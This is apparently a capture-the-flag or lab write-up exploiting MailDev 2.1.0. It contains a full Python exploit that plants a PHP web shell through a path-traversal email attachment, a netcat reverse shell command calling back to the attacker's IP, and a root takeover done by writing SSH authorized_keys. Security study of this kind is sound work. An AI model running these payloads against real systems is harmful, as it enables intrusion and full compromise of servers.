### Exploitation

There are three ports open for this machine, two of them TCP-1025 and TCP-1080 are part of the maildev software:
![](/assets/img/Pasted-image-20250131124505.png)

The HTTP port TCP-1080 as shown in the previous image displays the version running on this machine, so first step is to identify a good exploit for [MailDev 2.1.0](https://raw.githubusercontent.com/Tim-Hoekstra/MailDev-2.1.0-Exploit-RCE/refs/heads/main/exploit.py), unfortunately this doesn't works, so with the aid of ChatGPT and after understanding the exploit I came with this exploit:
```bash
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage

# Configuration
smtp_server = "10.0.160.229" #Replace with your MailDev server
smtp_port = 1025  # Replace with the correct SMTP port
sender_email = "attacker@codegate2023.org"
recipient_email = "victim@codegate2023.org"

# Malicious JavaScript to overwrite routes.js
malicious_js = """
<?php echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; ?>
"""

# Create the multipart email
msg = MIMEMultipart("alternative")  # Using "alternative" instead of "mixed"
msg["From"] = sender_email
msg["To"] = recipient_email
msg["Subject"] = "Exploit Email"

# Attach the malicious JavaScript as plain text
malicious_part = MIMEImage(malicious_js.encode('utf-8'), _subtype="png", name="a.png")
malicious_part.add_header("Content-ID", "<../../../../var/www/html/shell.php>")
#malicious_part.add_header("Content-Disposition", "inline")
msg.attach(malicious_part)

# Send the email
with smtplib.SMTP(smtp_server, smtp_port) as server:
    server.sendmail(sender_email, recipient_email, msg.as_string())

print("Exploit email sent.")

```
An important step to consider here is that the exploit is an Arbitrary File Write, because of this, we need to know what path is going to be used to upload our shell, since the directory of the MailDev UI port is not known, the best approach is to upload our shell to the most common path of the Nginx server `/var/www/html`. After executing this exploit we have a reverse shell:

```bash
http://10.0.160.229/shell.php?cmd=whoami
```

![](/assets/img/Pasted-image-20250131125619.png)

All that lefts is to execute the reverse shell of your choice, I used:
```bash
nc -e /bin/bash 10.10.5.122 1234
```

### Privilege Escalation
This was a privilege escalation hidden on plainsight and linpeas will not help to discover the privesc, if you do a basisc `ls -al` to the uploaded shell.php uploaded to get the revshell, you'll see that it was uploaded not as `www-data` but as root:
```bash
www-data@maildev:/var/www/html# ls -al
total 20
drwxr-xr-x 1 www-data root 4096 Jan 31 18:38 .
drwxr-xr-x 1 root     root 4096 Jan  3  2024 ..
-rw-r--r-- 1 www-data root  615 Jan  3  2024 index.nginx-debian.html
-rw-r--r-- 1 root     root   62 Jan 31 18:38 shell.php
```
Then you have Arbitrary File Write anywhere on the system, so let's upload our `authorized_keys` to the ``/root/.ssh` folder by modifing this line of code on our exploit:
```bash
# Malicious JavaScript to overwrite routes.js
malicious_js = """
ssh-ed25519 A<REDACTED>h kali@kali
"""
```
And we are inside!!!

### Post Exploitation
Flags are stored at:

`/etc/passwd`
`/etc/shadow`
`/proc/1/environ`
`/root`


### Credentials

No credentials were identified or needed

### Notes

- The privilege escalation for this one was very tricky, all you need to do is check the permissions of the uploaded webshell from the exploitation step, you'll see that is uploaded as root, then you'll notice that you can upload any file anywhere on the system.
